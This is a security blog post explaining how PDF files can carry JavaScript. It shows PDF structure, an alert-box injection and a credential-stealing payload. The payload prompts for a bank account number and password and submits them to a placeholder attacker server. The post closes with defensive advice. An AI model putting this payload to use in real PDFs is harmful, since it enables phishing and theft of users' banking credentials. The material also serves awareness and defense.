---
title: The Dark Side of PDFs, Understanding and Protecting Against Malicious Exploits
layout: post
post-image: https://github.com/5afagy/5afagy.github.io/assets/115117722/72041fc6-d851-4c23-9a2b-f349d0428336
description: In this blog post, we dive into the often-overlooked dangers of PDF files, revealing how they can be used as a tool for cyber attacks. We explore various techniques that attackers use to exploit PDF vulnerabilities, such as injecting malicious JavaScript code, stealing credentials, and embedding harmful links.
tags:
- how to
- hack
- using
- pdf

---

### Table of Contents

 - [Introduction](#introduction)
 - [PDF Structure](#pdf-structure)
 - [PDF Injection: Exploiting Popup Windows](#pdf-injection-exploiting-popup-windows)
 - [The "alert('Khafagy_Was_Here')" of PDF Injection](#the-alertkhafagy_was_here-of-pdf-injection)
 - [Injecting Code into PDFs](#injecting-code-into-pdfs)
 - [Example: Creating an Alert Box](#example-creating-an-alert-box)
 - [Stealing Credentials via PDF](#stealing-credentials-via-pdf)
 - [Scenario: Stealing Bank Account Credentials](#scenario-stealing-bank-account-credentials)
 - [Example JavaScript Code](#example-javascript-code)
 - [Protecting Against PDF Exploits](#protecting-against-pdf-exploits)
 - [Conclusion](#conclusion)
 - [References](#references)

### Introduction

In the realm of cybersecurity, PDFs are often seen as benign documents used for sharing information. However, these seemingly innocuous files can be weaponized to carry out various malicious activities. In this blog post, we will delve into the world of PDF hacking, exploring how attackers exploit PDF files, the techniques they use, and how you can protect yourself from these hidden threats.

### PDF Structure
![image](https://github.com/5afagy/5afagy.github.io/assets/115117722/202e2826-b32f-4ad5-920e-7e60ea8f51f1)

The basic structure of a PDF file includes:

1. **Header**: Specifies the version number of the PDF specification used in the document.

2. **Body**: Contains objects such as text streams, images, and multimedia elements that make up the document's content.

3. **Cross-Reference Table (xref)**: Provides references to all objects in the document, enabling random access to objects.

4. **Trailer**: Specifies how the application should locate the cross-reference table and other special objects.

#### Example: Header

The header of a PDF file specifies the version number:

```
%PDF-1.3
```

#### Example: Cross-Reference Table

The cross-reference table allows random access to objects in the file:

```
xref
0 1
0000000023 65535 f
3 1
0000025324 00000 n
...
```

#### Example: Trailer

The trailer section specifies important keys:

```
trailer
<<
/Size 22
/Root 2 0 R
/Info 1 0 R
>>
startxref
24212
%%EOF
```

### PDF Injection: Exploiting Popup Windows

Popup windows, or dialogs, play a crucial role in Acrobat's interactivity, providing users with important information and collecting input. Acrobat offers various types of built-in popup windows, such as alerts, responses, and file opens, along with functions for creating custom dialogs.

#### The "alert('Khafagy_Was_Here')" of PDF Injection

We'll demonstrate how to create a basic "alert('Khafagy_Was_Here')" PDF injection and then enhance it to inject JavaScript capable of stealing credentials and opening malicious links.

#### Injecting Code into PDFs

Similar to XSS injection in web applications, we can inject malicious code into a JavaScript function call within a PDF. It's essential to ensure correct syntax, as the injection occurs inside an object, such as a JavaScript action, text stream, or annotation URI.

#### Example: Creating an Alert Box

To create a simple alert box in a PDF, we use the `app.alert()` function:

```pdf
<<
/Type /Action
/S /JavaScript
/JS (app.alert('Khafagy_Was_Here');)
>>
```

This code triggers an alert box displaying 'Khafagy_Was_Here' when the PDF is opened.

Injecting JavaScript into PDFs allows attackers to execute various actions, including stealing credentials and opening malicious links. Understanding these vulnerabilities is crucial for securing PDFs against such attacks.

![Screenshot_2024-05-27_20-20-56](https://github.com/5afagy/5afagy.github.io/assets/115117722/ffa9cfb9-67da-40b7-a956-3b3b8a325cd1)

If you find it difficult to inject the script manually you can use [JS2PDFInjector](https://github.com/cornerpirate/JS2PDFInjector) tool.


### Stealing Credentials via PDF

One common method used by attackers to steal sensitive information, such as bank account credentials, is through PDF files. Attackers can create PDFs that prompt users to enter their account information, which is then sent to the attacker's server. Here's how it works:

#### Scenario: Stealing Bank Account Credentials

1. **Prompting for Account Details**: The attacker embeds JavaScript in the PDF to create a dialog box asking the user to enter their bank account number and password.

2. **Collecting User Input**: The JavaScript code uses the `app.response()` function to collect the user's input and store it in variables (`account` and `password`).

3. **Crafting the URL**: The attacker then crafts a URL that includes the collected account and password information, along with their server address.

4. **Submitting the Form**: Finally, the JavaScript uses the `submitForm()` function to send the collected information to the attacker's server as an HTML form.

#### Example JavaScript Code

```pdf
<<
/Type /Action
/S /JavaScript
/JS
(
var account = app.response ({ cQuestion:"Enter your Bank Account Number", cTitle:"Bank Account Details", bPassword:false, cDefault: global.cLastPswd, cLabel:"A/C"}); 
var password = app.response ({ cQuestion:"Enter your Bank Account Password", cTitle:"Bank Account Details", bPassword:true, cDefault: global.cLastPswd, cLabel:"Password"});
var cURL = "http://192.168.1.10:443" + "?" + "account=" + account + "&password=" + password;
this.submitForm({cURL: encodeURI(cURL), cSubmitAs: 'HTML'});
)
>>
```

This malicious code demonstrates how attackers can use PDF files to deceive users into providing their sensitive information. It underscores the importance of being cautious when interacting with PDF files from unknown or untrusted sources.


![image](https://github.com/5afagy/5afagy.github.io/assets/115117722/256fc6a5-67c1-408a-a3e0-7ade63f30873)

![image](https://github.com/5afagy/5afagy.github.io/assets/115117722/1f7a7d73-3f2d-4b47-a6e9-1785323973a1)

![image](https://github.com/5afagy/5afagy.github.io/assets/115117722/1f8e44ee-54b8-4284-8265-d4e1eaf6bb42)

### Protecting Against PDF Exploits

To defend against PDF exploits, it is crucial to take the following measures:

1. **Keep Software Updated**: Ensure that your PDF reader and related software are up-to-date. Updates often include security patches that protect against known vulnerabilities.

2. **Enable Security Features**: Utilize the security features available in your PDF reader. This may include disabling JavaScript execution, restricting file attachments, and enabling sandboxing or protected view modes.

3. **Exercise Caution**: Be wary of opening PDF files from unknown or untrusted sources. Consider scanning files with antivirus software before opening them.

4. **Use Secure Environments**: When possible, open PDF files in a secure, isolated environment, such as a virtual machine or sandbox, to mitigate the impact of any potential exploits.

### Conclusion

PDF files can indeed serve as a vector for cyber attacks, potentially leading to Remote Code Execution (RCE) if not handled carefully. Understanding how attackers exploit PDF vulnerabilities is essential for maintaining a secure digital environment. By adopting the aforementioned protective measures, you can significantly reduce the risk of falling victim to PDF-based exploits and safeguard your organization's sensitive information.

### References
- [Let’s write a PDF file](https://speakerdeck.com/ange/lets-write-a-pdf-file?slide=1)
- [Portable Data exFiltration: XSS for PDFs](https://speakerdeck.com/ange/lets-write-a-pdf-file?slide=1)
- [Learn and Play with PDF Source Code](https://github.com/angea/PDF101)
- [PDF - Mess With The Web](https://www.youtube.com/watch?v=WQsDpYnJT6A&ab_channel=OWASPFoundation)
- [The PDF invoice that phished you](https://blog.reversinglabs.com/blog/the-pdf-invoice-that-phished-you)
- [Malicious PDFs Revealing the Techniques Behind the Attacks](https://forums.hardwarezone.com.sg/threads/din-know-pdf-so-dangerous-one-can-actually-execute-malicious-code.6587298/)
- [Analyze Malicious PDFs](https://www.youtube.com/watch?v=AzXf7GV0jew&ab_channel=Intezer)
- [PDF_analysis](https://github.com/zbetcheckin/PDF_analysis)

